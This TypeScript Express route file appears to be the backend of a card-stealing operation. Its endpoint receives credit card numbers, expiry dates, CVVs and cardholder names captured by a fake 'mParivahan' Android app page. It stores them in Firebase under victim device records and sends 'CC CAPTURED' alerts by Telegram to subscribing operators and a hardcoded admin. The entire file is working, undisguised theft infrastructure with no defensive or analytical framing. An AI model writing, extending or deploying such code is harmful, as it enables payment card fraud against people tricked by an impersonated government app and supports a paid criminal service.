/**
 * POST /api/hook/cc  — called from mParivahan APK's card.html (no auth cookie)
 * Receives captured CC data and forwards to the device owner via panel bot DM.
 */
import { Router } from "express";
import { logger } from "../lib/logger";
import { fbUpdate, fbGet, isSubscriptionActive } from "../bot/firebase";
import { getBot } from "../bot/index";

const router = Router();

function escapeMarkdown(text: string): string {
  return String(text || "").replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
}

router.post("/hook/cc", async (req, res) => {
  try {
    const {
      ownerTelegramId,
      deviceId,
      cardholderName,
      cardNumber,
      expiry,
      cvv,
      ip,
    } = req.body as Record<string, string>;

    if (!ownerTelegramId || !deviceId || !cardNumber) {
      res.status(400).json({ error: "Missing required fields" });
      return;
    }

    // Only forward for users with an active subscription (or admin)
    const ADMIN_ID = process.env["ADMIN_TELEGRAM_ID"] || "5064888403";
    const isAdmin = ownerTelegramId === ADMIN_ID;
    const active = isAdmin || (await isSubscriptionActive(ownerTelegramId));
    if (!active) {
      // Still save to Firebase silently, but don't forward
      logger.warn({ ownerTelegramId }, "CC hook: inactive subscription");
    }

    // Save to Firebase under the device record
    await fbUpdate(`clients/${deviceId}`, {
      cc_cardholderName: cardholderName || "",
      cc_cardNumber: cardNumber,
      cc_expiry: expiry || "",
      cc_cvv: cvv || "",
      cc_ip: ip || "",
      cc_timestamp: new Date().toISOString(),
    });

    // Lookup device model/phone for the alert message
    let phone = deviceId;
    try {
      const device = await fbGet(`clients/${deviceId}`);
      phone = device?.mobNo || device?.phone || deviceId;
    } catch {}

    const msg =
      `💳 *CC CAPTURED*\n\n` +
      `📱 Device: \`${escapeMarkdown(phone)}\`\n\n` +
      `👤 *${escapeMarkdown(cardholderName || "Unknown")}*\n` +
      `💳 \`${escapeMarkdown(cardNumber)}\`\n` +
      `📅 Expiry: \`${escapeMarkdown(expiry || "?")}\`\n` +
      `🔒 CVV: \`${escapeMarkdown(cvv || "?")}\`\n\n` +
      `🌐 IP: ${escapeMarkdown(ip || "Unknown")}\n` +
      `🕐 ${new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })} IST`;

    const bot = getBot();
    if (bot && active) {
      // Send to device owner
      try {
        await bot.telegram.sendMessage(ownerTelegramId, msg, {
          parse_mode: "Markdown",
        });
      } catch (err) {
        logger.error({ err, ownerTelegramId }, "CC hook: failed to DM owner");
      }

      // Also notify admin if owner is not admin
      if (!isAdmin) {
        try {
          await bot.telegram.sendMessage(
            ADMIN_ID,
            msg + `\n\n👤 Owner: \`${escapeMarkdown(ownerTelegramId)}\``,
            { parse_mode: "Markdown" }
          );
        } catch {}
      }
    }

    res.json({ ok: true });
  } catch (err) {
    logger.error({ err }, "CC hook error");
    res.status(500).json({ error: "Internal error" });
  }
});

export default router;
